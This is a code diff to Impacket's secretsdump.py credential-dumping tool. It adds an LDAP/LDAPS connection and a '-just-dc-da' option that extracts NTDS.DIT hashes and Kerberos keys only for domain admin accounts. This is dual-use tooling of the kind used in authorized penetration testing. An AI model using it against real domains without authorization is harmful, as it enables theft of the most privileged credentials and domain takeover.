@@ -55,6 +55,7 @@ from impacket import version
 from impacket.examples import logger
 from impacket.examples.utils import parse_target
 from impacket.smbconnection import SMBConnection
+from impacket.ldap.ldap import LDAPConnection, LDAPSessionError
 
 from impacket.examples.secretsdump import LocalOperations, RemoteOperations, SAMHashes, LSASecrets, NTDSHashes
 from impacket.krb5.keytab import Keytab
@@ -75,6 +76,7 @@ class DumpSecrets:
         self.__nthash = ''
         self.__aesKey = options.aesKey
         self.__smbConnection = None
+        self.__ldapConnection = None
         self.__remoteOps = None
         self.__SAMHashes = None
         self.__NTDSHashes = None
@@ -92,6 +94,7 @@ class DumpSecrets:
         self.__justDC = options.just_dc
         self.__justDCNTLM = options.just_dc_ntlm
         self.__justUser = options.just_dc_user
+        self.__justDomainAdmins = options.just_dc_da
         self.__pwdLastSet = options.pwd_last_set
         self.__printUserStatus= options.user_status
         self.__resumeFileName = options.resumefile
@@ -109,6 +112,46 @@ class DumpSecrets:
                                                self.__nthash, self.__aesKey, self.__kdcHost)
         else:
             self.__smbConnection.login(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash)
+
+    def ldapConnect(self):
+        if self.__doKerberos:
+            self.__target = self.__remoteHost
+        else:
+            if self.__kdcHost is not None:
+                self.__target = self.__kdcHost
+            else:
+                self.__target = self.__domain
+
+        # Create the baseDN
+        if self.__domain:
+            domainParts = self.__domain.split('.')
+        else:
+            domain = self.__target.split('.', 1)[-1]
+            domainParts = domain.split('.')
+        self.baseDN = ''
+        for i in domainParts:
+            self.baseDN += 'dc=%s,' % i
+        # Remove last ','
+        self.baseDN = self.baseDN[:-1]
+
+        try:
+            self.__ldapConnection = LDAPConnection('ldap://%s' % self.__target, self.baseDN, self.__kdcHost)
+            if self.__doKerberos is not True:
+                self.__ldapConnection.login(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash)
+            else:
+                self.__ldapConnection.kerberosLogin(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash,
+                                                    self.__aesKey, kdcHost=self.__kdcHost)
+        except LDAPSessionError as e:
+            if str(e).find('strongerAuthRequired') >= 0:
+                # We need to try SSL
+                self.__ldapConnection = LDAPConnection('ldaps://%s' % self.__target, self.baseDN, self.__kdcHost)
+                if self.__doKerberos is not True:
+                    self.__ldapConnection.login(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash)
+                else:
+                    self.__ldapConnection.kerberosLogin(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash,
+                                                        self.__aesKey, kdcHost=self.__kdcHost)
+            else:
+                raise
 
     def dump(self):
         try:
@@ -128,6 +171,12 @@ class DumpSecrets:
             else:
                 self.__isRemote = True
                 bootKey = None
+                if self.__justDomainAdmins is not None:
+                    logging.info('Querying %s for information about domain admins via LDAP' % self.__domain)
+                    try:
+                        self.ldapConnect()
+                    except Exception as e:
+                        logging.error('LDAP connection failed: %s' % str(e))
                 try:
                     try:
                         self.connect()
@@ -141,7 +190,7 @@ class DumpSecrets:
                         else:
                             raise
 
-                    self.__remoteOps  = RemoteOperations(self.__smbConnection, self.__doKerberos, self.__kdcHost)
+                    self.__remoteOps  = RemoteOperations(self.__smbConnection, self.__ldapConnection, self.__doKerberos, self.__kdcHost)
                     self.__remoteOps.setExecMethod(self.__options.exec_method)
                     if self.__justDC is False and self.__justDCNTLM is False or self.__useVSSMethod is True:
                         self.__remoteOps.enableRegistry()
@@ -207,7 +256,7 @@ class DumpSecrets:
                                            useVSSMethod=self.__useVSSMethod, justNTLM=self.__justDCNTLM,
                                            pwdLastSet=self.__pwdLastSet, resumeSession=self.__resumeFileName,
                                            outputFileName=self.__outputFileName, justUser=self.__justUser,
-                                           printUserStatus= self.__printUserStatus)
+                                           justDomainAdmins=self.__justDomainAdmins, printUserStatus=self.__printUserStatus)
             try:
                 self.__NTDSHashes.dump()
             except Exception as e:
@@ -221,7 +270,7 @@ class DumpSecrets:
                     if resumeFile is not None:
                         os.unlink(resumeFile)
                 logging.error(e)
-                if self.__justUser and str(e).find("ERROR_DS_NAME_ERROR_NOT_UNIQUE") >=0:
+                if (self.__justUser or self.__justDomainAdmins) and str(e).find("ERROR_DS_NAME_ERROR_NOT_UNIQUE") >= 0:
                     logging.info("You just got that error because there might be some duplicates of the same name. "
                                  "Try specifying the domain name for the user as well. It is important to specify it "
                                  "in the form of NetBIOS domain name/user (e.g. contoso/Administratror).")
@@ -301,6 +350,9 @@ if __name__ == '__main__':
     group.add_argument('-just-dc-user', action='store', metavar='USERNAME',
                        help='Extract only NTDS.DIT data for the user specified. Only available for DRSUAPI approach. '
                             'Implies also -just-dc switch')
+    group.add_argument('-just-dc-da', action='store', metavar='TARGET_NETBIOS_NAME',
+                       help='Extract only NTDS.DIT data for domain admins (AdminCount=1). Only available for DRSUAPI approach. '
+                            'Implies also -just-dc switch')
     group.add_argument('-just-dc', action='store_true', default=False,
                         help='Extract only NTDS.DIT data (NTLM hashes and Kerberos keys)')
     group.add_argument('-just-dc-ntlm', action='store_true', default=False,
@@ -345,7 +397,7 @@ if __name__ == '__main__':
 
     domain, username, password, remoteName = parse_target(options.target)
 
-    if options.just_dc_user is not None:
+    if options.just_dc_user is not None or options.just_dc_da is not None:
         if options.use_vss is True:
             logging.error('-just-dc-user switch is not supported in VSS mode')
             sys.exit(1)
